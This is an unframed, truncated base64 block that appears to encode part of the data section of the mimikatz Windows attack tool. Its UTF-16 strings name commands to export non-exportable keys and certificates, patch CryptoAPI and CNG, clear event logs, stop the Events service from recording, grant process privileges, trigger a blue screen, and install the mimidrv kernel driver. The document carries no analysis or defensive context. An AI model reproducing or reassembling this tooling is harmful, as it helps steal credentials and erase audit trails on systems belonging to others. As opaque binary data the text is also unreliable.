AAAAAAAABQAFIATwBWAF8AUgBTAEEAXwBTAEkARwAAAAAAAAAAAFAAUgBPAFYAXwBSAFMAQQBfAEYAVQBMAEwAAAAAAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAbgBoAGEAbgBjAGUAZAAgAFIAUwBBACAAYQBuAGQAIABBAEUAUwAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAAAATQBTAF8ARQBOAEgAXwBSAFMAQQBfAEEARQBTAF8AUABSAE8AVgAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByACAAKABQAHIAbwB0AG8AdAB5AHAAZQApAAAAAAAAAE0AUwBfAEUATgBIAF8AUgBTAEEAXwBBAEUAUwBfAFAAUgBPAFYAXwBYAFAAAAAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAAUwBtAGEAcgB0ACAAQwBhAHIAZAAgAEMAcgB5AHAAdABvACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAE0AUwBfAFMAQwBBAFIARABfAFAAUgBPAFYAAAAAAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAEQASAAgAFMAQwBoAGEAbgBuAGUAbAAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAAAAAAAAAABNAFMAXwBEAEUARgBfAEQASABfAFMAQwBIAEEATgBOAEUATABfAFAAUgBPAFYAAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAbgBoAGEAbgBjAGUAZAAgAEQAUwBTACAAYQBuAGQAIABEAGkAZgBmAGkAZQAtAEgAZQBsAGwAbQBhAG4AIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAAAATQBTAF8ARQBOAEgAXwBEAFMAUwBfAEQASABfAFAAUgBPAFYAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAQgBhAHMAZQAgAEQAUwBTACAAYQBuAGQAIABEAGkAZgBmAGkAZQAtAEgAZQBsAGwAbQBhAG4AIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAAAATQBTAF8ARABFAEYAXwBEAFMAUwBfAEQASABfAFAAUgBPAFYAAAAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABCAGEAcwBlACAARABTAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAAAAAAAAAE0AUwBfAEQARQBGAF8ARABTAFMAXwBQAFIATwBWAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAFIAUwBBACAAUwBDAGgAYQBuAG4AZQBsACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAAAABNAFMAXwBEAEUARgBfAFIAUwBBAF8AUwBDAEgAQQBOAE4ARQBMAF8AUABSAE8AVgAAAAAAAAAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABSAFMAQQAgAFMAaQBnAG4AYQB0AHUAcgBlACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAAAAAATQBTAF8ARABFAEYAXwBSAFMAQQBfAFMASQBHAF8AUABSAE8AVgAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABTAHQAcgBvAG4AZwAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAAABNAFMAXwBTAFQAUgBPAE4ARwBfAFAAUgBPAFYAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAARQBuAGgAYQBuAGMAZQBkACAAQwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAFAAcgBvAHYAaQBkAGUAcgAgAHYAMQAuADAAAAAAAE0AUwBfAEUATgBIAEEATgBDAEUARABfAFAAUgBPAFYAAAAAAAAAAAAAAAAAAAAAAE0AaQBjAHIAbwBzAG8AZgB0ACAAQgBhAHMAZQAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAIAB2ADEALgAwAAAAAABNAFMAXwBEAEUARgBfAFAAUgBPAFYAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBTAEUAUgBWAEkAQwBFAFMAAAAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAFUAUwBFAFIAUwAAAAAAAAAAAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AQwBVAFIAUgBFAE4AVABfAFMARQBSAFYASQBDAEUAAAAAAAAAAAAAAAAAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAF8ARQBOAFQARQBSAFAAUgBJAFMARQAAAAAAAAAAAAAAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAF8ARwBSAE8AVQBQAF8AUABPAEwASQBDAFkAAAAAAAAAAABDAEUAUgBUAF8AUwBZAFMAVABFAE0AXwBTAFQATwBSAEUAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAAAAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8AQwBVAFIAUgBFAE4AVABfAFUAUwBFAFIAXwBHAFIATwBVAFAAXwBQAE8ATABJAEMAWQAAAEMARQBSAFQAXwBTAFkAUwBUAEUATQBfAFMAVABPAFIARQBfAEMAVQBSAFIARQBOAFQAXwBVAFMARQBSAAAAAAAAAAAAAAAAAFsAZQB4AHAAZQByAGkAbQBlAG4AdABhAGwAXQAgAFAAYQB0AGMAaAAgAEMATgBHACAAcwBlAHIAdgBpAGMAZQAgAGYAbwByACAAZQBhAHMAeQAgAGUAeABwAG8AcgB0AAAAAAAAAAAAYwBuAGcAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABQAGEAdABjAGgAIABDAHIAeQBwAHQAbwBBAFAASQAgAGwAYQB5AGUAcgAgAGYAbwByACAAZQBhAHMAeQAgAGUAeABwAG8AcgB0AAAAAAAAAAAAYwBhAHAAaQAAAAAAAAAAAEwAaQBzAHQAIAAoAG8AcgAgAGUAeABwAG8AcgB0ACkAIABrAGUAeQBzACAAYwBvAG4AdABhAGkAbgBlAHIAcwAAAAAAAAAAAGsAZQB5AHMAAAAAAAAAAABMAGkAcwB0ACAAKABvAHIAIABlAHgAcABvAHIAdAApACAAYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAAAAAAAAAYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAAAAAAAAAAABMAGkAcwB0ACAAYwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAHMAdABvAHIAZQBzAAAAAAAAAHMAdABvAHIAZQBzAAAAAABMAGkAcwB0ACAAYwByAHkAcAB0AG8AZwByAGEAcABoAGkAYwAgAHAAcgBvAHYAaQBkAGUAcgBzAAAAAAAAAAAAcAByAG8AdgBpAGQAZQByAHMAAAAAAAAAQwByAHkAcAB0AG8AIABNAG8AZAB1AGwAZQAAAAAAAABjAHIAeQBwAHQAbwAAAAAAcgBzAGEAZQBuAGgAAAAAAENQRXhwb3J0S2V5AAAAAABuAGMAcgB5AHAAdAAAAAAATkNyeXB0T3BlblN0b3JhZ2VQcm92aWRlcgAAAAAAAABOQ3J5cHRFbnVtS2V5cwAATkNyeXB0T3BlbktleQAAAE5DcnlwdEV4cG9ydEtleQBOQ3J5cHRHZXRQcm9wZXJ0eQAAAAAAAABOQ3J5cHRGcmVlQnVmZmVyAAAAAAAAAABOQ3J5cHRGcmVlT2JqZWN0AAAAAAAAAABCQ3J5cHRFbnVtUmVnaXN0ZXJlZFByb3ZpZGVycwAAAEJDcnlwdEZyZWVCdWZmZXIAAAAAAAAAAAoAQwByAHkAcAB0AG8AQQBQAEkAIABwAHIAbwB2AGkAZABlAHIAcwAgADoACgAAACUAMgB1AC4AIAAlAHMACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AcAByAG8AdgBpAGQAZQByAHMAIAA7ACAAQwByAHkAcAB0AEUAbgB1AG0AUAByAG8AdgBpAGQAZQByAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAACgBDAE4ARwAgAHAAcgBvAHYAaQBkAGUAcgBzACAAOgAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBwAHIAbwB2AGkAZABlAHIAcwAgADsAIABCAEMAcgB5AHAAdABFAG4AdQBtAFIAZQBnAGkAcwB0AGUAcgBlAGQAUAByAG8AdgBpAGQAZQByAHMAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABzAHkAcwB0AGUAbQBzAHQAbwByAGUAAABBAHMAawBpAG4AZwAgAGYAbwByACAAUwB5AHMAdABlAG0AIABTAHQAbwByAGUAIAAnACUAcwAnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AcwB0AG8AcgBlAHMAIAA7ACAAQwBlAHIAdABFAG4AdQBtAFMAeQBzAHQAZQBtAFMAdABvAHIAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABNAHkAAAAAAAAAAABzAHQAbwByAGUAAAAAAAAAAAAAAAAAAAAgACoAIABTAHkAcwB0AGUAbQAgAFMAdABvAHIAZQAgACAAOgAgACcAJQBzACcAIAAoADAAeAAlADAAOAB4ACkACgAgACoAIABTAHQAbwByAGUAIAAgACAAIAAgACAAIAAgACAAOgAgACcAJQBzACcACgAAAAAAAAAKACUAMgB1AC4AIAAlAHMACgAAAAAAAAAoAG4AdQBsAGwAKQAAAAAACQBLAGUAeQAgAEMAbwBuAHQAYQBpAG4AZQByACAAIAA6ACAAJQBzAAoACQBQAHIAbwB2AGkAZABlAHIAIAAgACAAIAAgACAAIAA6ACAAJQBzAAoAAAAAAAkAVAB5AHAAZQAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgACUAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwByAHkAcAB0AEcAZQB0AFUAcwBlAHIASwBlAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgADsAIABrAGUAeQBTAHAAZQBjACAAPQA9ACAAQwBFAFIAVABfAE4AQwBSAFkAUABUAF8ASwBFAFkAXwBTAFAARQBDACAAdwBpAHQAaABvAHUAdAAgAEMATgBHACAASABhAG4AZABsAGUAIAA/AAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgADsAIABDAHIAeQBwAHQAQQBjAHEAdQBpAHIAZQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUAByAGkAdgBhAHQAZQBLAGUAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAEMAZQByAHQARwBlAHQAQwBlAHIAdABpAGYAaQBjAGEAdABlAEMAbwBuAHQAZQB4AHQAUAByAG8AcABlAHIAdAB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABHAGUAdABOAGEAbQBlAFMAdAByAGkAbgBnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABHAGUAdABOAGEAbQBlAFMAdAByAGkAbgBnACAAKABmAG8AcgAgAGwAZQBuACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAAOwAgAEMAZQByAHQATwBwAGUAbgBTAHQAbwByAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAHAAcgBvAHYAaQBkAGUAcgAAAAAAAAAAAHAAcgBvAHYAaQBkAGUAcgB0AHkAcABlAAAAAAAAAAAAbQBhAGMAaABpAG4AZQAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABTAG8AZgB0AHcAYQByAGUAIABLAGUAeQAgAFMAdABvAHIAYQBnAGUAIABQAHIAbwB2AGkAZABlAHIAAABjAG4AZwBwAHIAbwB2AGkAZABlAHIAAAAAAAAAAAAAACAAKgAgAFMAdABvAHIAZQAgACAAIAAgACAAIAAgACAAIAA6ACAAJwAlAHMAJwAKACAAKgAgAFAAcgBvAHYAaQBkAGUAcgAgACAAIAAgACAAIAA6ACAAJwAlAHMAJwAgACgAJwAlAHMAJwApAAoAIAAqACAAUAByAG8AdgBpAGQAZQByACAAdAB5AHAAZQAgADoAIAAnACUAcwAnACAAKAAlAHUAKQAKACAAKgAgAEMATgBHACAAUAByAG8AdgBpAGQAZQByACAAIAA6ACAAJwAlAHMAJwAKAAAAAAAAAAAACgBDAHIAeQBwAHQAbwBBAFAASQAgAGsAZQB5AHMAIAA6AAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBrAGUAeQBzACAAOwAgAEMAcgB5AHAAdABHAGUAdABVAHMAZQByAEsAZQB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AawBlAHkAcwAgADsAIABDAHIAeQBwAHQARwBlAHQAUAByAG8AdgBQAGEAcgBhAG0AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAoAQwBOAEcAIABrAGUAeQBzACAAOgAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGsAZQB5AHMAIAA7ACAATgBDAHIAeQBwAHQATwBwAGUAbgBLAGUAeQAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBrAGUAeQBzACAAOwAgAE4AQwByAHkAcAB0AEUAbgB1AG0ASwBlAHkAcwAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AawBlAHkAcwAgADsAIABOAEMAcgB5AHAAdABPAHAAZQBuAFMAdABvAHIAYQBnAGUAUAByAG8AdgBpAGQAZQByACAAJQAwADgAeAAKAAAAAAAAAAAARQB4AHAAbwByAHQAIABQAG8AbABpAGMAeQAAAAAAAABMAGUAbgBnAHQAaAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAHAAcgBpAG4AdABLAGUAeQBJAG4AZgBvAHMAIAA7ACAATgBDAHIAeQBwAHQARwBlAHQAUAByAG8AcABlAHIAdAB5ACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AcAByAGkAbgB0AEsAZQB5AEkAbgBmAG8AcwAgADsAIABDAHIAeQBwAHQARwBlAHQASwBlAHkAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFkARQBTAAAATgBPAAAAAAAJAEUAeABwAG8AcgB0AGEAYgBsAGUAIABrAGUAeQAgADoAIAAlAHMACgAJAEsAZQB5ACAAcwBpAHoAZQAgACAAIAAgACAAIAAgADoAIAAlAHUACgAAAAAAcAB2AGsAAABDAEEAUABJAFAAUgBJAFYAQQBUAEUAQgBMAE8AQgAAAE8ASwAAAAAASwBPAAAAAAAJAFAAcgBpAHYAYQB0AGUAIABlAHgAcABvAHIAdAAgADoAIAAlAHMAIAAtACAAAAAnACUAcwAnAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AEsAZQB5AFQAbwBGAGkAbABlACAAOwAgAEUAeABwAG8AcgB0ACAALwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AEsAZQB5AFQAbwBGAGkAbABlACAAOwAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBnAGUAbgBlAHIAYQB0AGUARgBpAGwAZQBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAGQAZQByAAAACQBQAHUAYgBsAGkAYwAgAGUAeABwAG8AcgB0ACAAIAA6ACAAJQBzACAALQAgAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZQB4AHAAbwByAHQAQwBlAHIAdAAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AEMAZQByAHQAIAA7ACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGcAZQBuAGUAcgBhAHQAZQBGAGkAbABlAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABwAGYAeAAAAG0AaQBtAGkAawBhAHQAegAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AEMAZQByAHQAIAA7ACAARQB4AHAAbwByAHQAIAAvACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAlAHMAXwAlAHMAXwAlAHUAXwAlAHMALgAlAHMAAAAAAEEAVABfAEsARQBZAEUAWABDAEgAQQBOAEcARQAAAAAAQQBUAF8AUwBJAEcATgBBAFQAVQBSAEUAAAAAAAAAAABDAE4ARwAgAEsAZQB5AAAAcgBzAGEAZQBuAGgALgBkAGwAbAAAAAAATABvAGMAYQBsACAAQwByAHkAcAB0AG8AQQBQAEkAIABwAGEAdABjAGgAZQBkAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AcABfAGMAYQBwAGkAIAA7ACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAHAAXwBjAGEAcABpACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFYAZQByAHkAQgBhAHMAaQBjAE0AbwBkAHUAbABlAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAG4AYwByAHkAcAB0AC4AZABsAGwAAAAAAG4AYwByAHkAcAB0AHAAcgBvAHYALgBkAGwAbAAAAAAASwBlAHkASQBzAG8AAAAAAEMAbABlAGEAcgAgAGEAbgAgAGUAdgBlAG4AdAAgAGwAbwBnAAAAAABjAGwAZQBhAHIAAAAAAAAAAAAAAAAAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABwAGEAdABjAGgAIABFAHYAZQBuAHQAcwAgAHMAZQByAHYAaQBjAGUAIAB0AG8AIABhAHYAbwBpAGQAIABuAGUAdwAgAGUAdgBlAG4AdABzAAAAZAByAG8AcAAAAAAAAAAAAEUAdgBlAG4AdAAgAG0AbwBkAHUAbABlAAAAAAAAAAAAZQB2AGUAbgB0AAAAAAAAAGwAbwBnAAAAZQB2AGUAbgB0AGwAbwBnAC4AZABsAGwAAAAAAAAAAAB3AGUAdgB0AHMAdgBjAC4AZABsAGwAAABFAHYAZQBuAHQATABvAGcAAAAAAAAAAABTAGUAYwB1AHIAaQB0AHkAAAAAAAAAAABVAHMAaQBuAGcAIAAiACUAcwAiACAAZQB2AGUAbgB0ACAAbABvAGcAIAA6AAoAAAAtACAAJQB1ACAAZQB2AGUAbgB0ACgAcwApAAoAAAAAAC0AIABDAGwAZQBhAHIAZQBkACAAIQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBlAHYAZQBuAHQAXwBjAGwAZQBhAHIAIAA7ACAAQwBsAGUAYQByAEUAdgBlAG4AdABMAG8AZwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZQB2AGUAbgB0AF8AYwBsAGUAYQByACAAOwAgAE8AcABlAG4ARQB2AGUAbgB0AEwAbwBnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAATABpAHMAdAAgAG0AaQBuAGkAZgBpAGwAdABlAHIAcwAAAAAAAAAAAG0AaQBuAGkAZgBpAGwAdABlAHIAcwAAAEwAaQBzAHQAIABGAFMAIABmAGkAbAB0AGUAcgBzAAAAZgBpAGwAdABlAHIAcwAAAEwAaQBzAHQAIABvAGIAagBlAGMAdAAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAHMAAAAAAAAAAABuAG8AdABpAGYATwBiAGoAZQBjAHQAAABMAGkAcwB0ACAAcgBlAGcAaQBzAHQAcgB5ACAAbgBvAHQAaQBmAHkAIABjAGEAbABsAGIAYQBjAGsAcwAAAAAAbgBvAHQAaQBmAFIAZQBnAAAAAAAAAAAATABpAHMAdAAgAGkAbQBhAGcAZQAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAHMAAABuAG8AdABpAGYASQBtAGEAZwBlAAAAAABMAGkAcwB0ACAAdABoAHIAZQBhAGQAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAAAAAAAAAbgBvAHQAaQBmAFQAaAByAGUAYQBkAAAATABpAHMAdAAgAHAAcgBvAGMAZQBzAHMAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAAAAAAG4AbwB0AGkAZgBQAHIAbwBjAGUAcwBzAAAAAAAAAAAATABpAHMAdAAgAFMAUwBEAFQAAAAAAAAAcwBzAGQAdAAAAAAAAAAAAEwAaQBzAHQAIABtAG8AZAB1AGwAZQBzAAAAAAAAAAAAbQBvAGQAdQBsAGUAcwAAAFMAZQB0ACAAYQBsAGwAIABwAHIAaQB2AGkAbABlAGcAZQAgAG8AbgAgAHAAcgBvAGMAZQBzAHMAAAAAAAAAAABwAHIAbwBjAGUAcwBzAFAAcgBpAHYAaQBsAGUAZwBlAAAAAAAAAAAARAB1AHAAbABpAGMAYQB0AGUAIABwAHIAbwBjAGUAcwBzACAAdABvAGsAZQBuAAAAcAByAG8AYwBlAHMAcwBUAG8AawBlAG4AAAAAAAAAAABQAHIAbwB0AGUAYwB0ACAAcAByAG8AYwBlAHMAcwAAAHAAcgBvAGMAZQBzAHMAUAByAG8AdABlAGMAdAAAAAAAQgBTAE8ARAAgACEAAAAAAGIAcwBvAGQAAAAAAAAAAABSAGUAbQBvAHYAZQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAAAAAC0AAAAAAAAAAAAAAEkAbgBzAHQAYQBsAGwAIABhAG4AZAAvAG8AcgAgAHMAdABhAHIAdAAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAAAAACsAAAAAAAAAcgBlAG0AbwB2AGUAAAAAAEwAaQBzAHQAIABwAHIAbwBjAGUAcwBzAAAAAAAAAAAAcAByAG8AYwBlAHMAcwAAAG0AaQBtAGkAZAByAHYALgBzAHkAcwAAAG0AaQBtAGkAZAByAHYAAABbACsAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAYQBsAHIAZQBhAGQAeQAgAHIAZQBnAGkAcwB0AGUAcgBlAGQACgAAAFsAKgBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABuAG8AdAAgAHAAcgBlAHMAZQBuAHQACgAAAAAAAAAAAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAAAAAAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAHMAdQBjAGMAZQBzAHMAZgB1AGwAbAB5ACAAcgBlAGcAaQBzAHQAZQByAGUAZAAKAAAAAAAAAAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAEEAQwBMACAAdABvACAAZQB2AGUAcgB5AG8AbgBlAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABXAG8AcgBsAGQAVABvAE0AaQBtAGkAawBhAHQAegAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABDAHIAZQBhAHQAZQBTAGUAcgB2AGkAYwBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAGkAcwBGAGkAbABlAEUAeABpAHMAdAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAGcAZQB0AEEAYgBzAG8AbAB1AHQAZQBQAGEAdABoAE8AZgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABPAHAAZQBuAFMAZQByAHYAaQBjAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABzAHQAYQByAHQAZQBkAAoAAAAAAAAAAABbACoAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAYQBsAHIAZQBhAGQAeQAgAHMAdABhAHIAdABlAGQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABfAG0AaQBtAGkAZAByAHYAIAA7ACAAUwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABPAHAAZQBuAFMAQwBNAGEAbgBhAGcAZQByACgAYwByAGUAYQB0AGUAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABzAHQAbwBwAHAAZQBkAAoAAAAAAAAAAAAAAAAAAAAAAFsAKgBdACAAbQBpAG0AaQBrAGEAdAB6AC